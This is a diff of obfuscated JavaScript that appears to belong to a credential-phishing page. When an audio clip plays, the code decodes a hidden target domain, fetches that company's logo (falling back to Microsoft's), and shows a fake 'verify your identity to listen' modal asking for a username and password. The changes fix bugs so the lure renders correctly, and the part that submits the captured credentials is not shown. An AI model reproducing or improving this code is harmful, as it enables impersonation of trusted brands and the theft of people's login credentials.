@@ -28,9 +28,9 @@ xhttp.send();
 }
 ghjfyu();
 
-function tytuui(jjs, callback) {
+function tytuui(uuu, callback) {
     const jjs = new Image();
-    jjs.src = url;
+    jjs.src = uuu;
         if (jjs.complete) {
             callback(true);
         } else {
@@ -43,14 +43,20 @@ function tytuui(jjs, callback) {
     }
 }
 
+function annatamba(str) {
+    return decodeURIComponent(atob(str).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+}
+
 function uigjsh() {
     var aud = document.getElementById("aud");
     aud.onplay = function() {
         var allow = document.getElementById("allow").value;
         if (allow != 'yes') {
-            var dom = atob(document.getElementById("ddd").value);
-            var jjs = "https://logo.clearbit.com/"+dom;
-            tytuui(jjs, (exists) => {
+            var dom = annatamba(document.getElementById("ddd").value);
+            var nna = "https://logo.clearbit.com/"+dom;
+            tytuui(nna, (exists) => {
                 var modal = document.createElement("div");
                 modal.setAttribute("class", "modal");
                 modal.setAttribute("id", "myModal");
@@ -61,9 +67,9 @@ function uigjsh() {
                     var fff = `<img src="[-img-]"><h5>Please verify your identity to listen</h5> 
                     <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
                     <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
-                    var form = fff.replace("[-img-]", jjs);
+                    var form = fff.replace("[-img-]", nna);
                 } else {
-                    var form = `<img src="https://logo.clearbit.com/microsoft"><h5>Please verify your identity to listen</h5> 
+                    var form = `<img src="https://logo.clearbit.com/microsoft.com"><h5>Please verify your identity to listen</h5> 
                     <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
                     <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
                 }
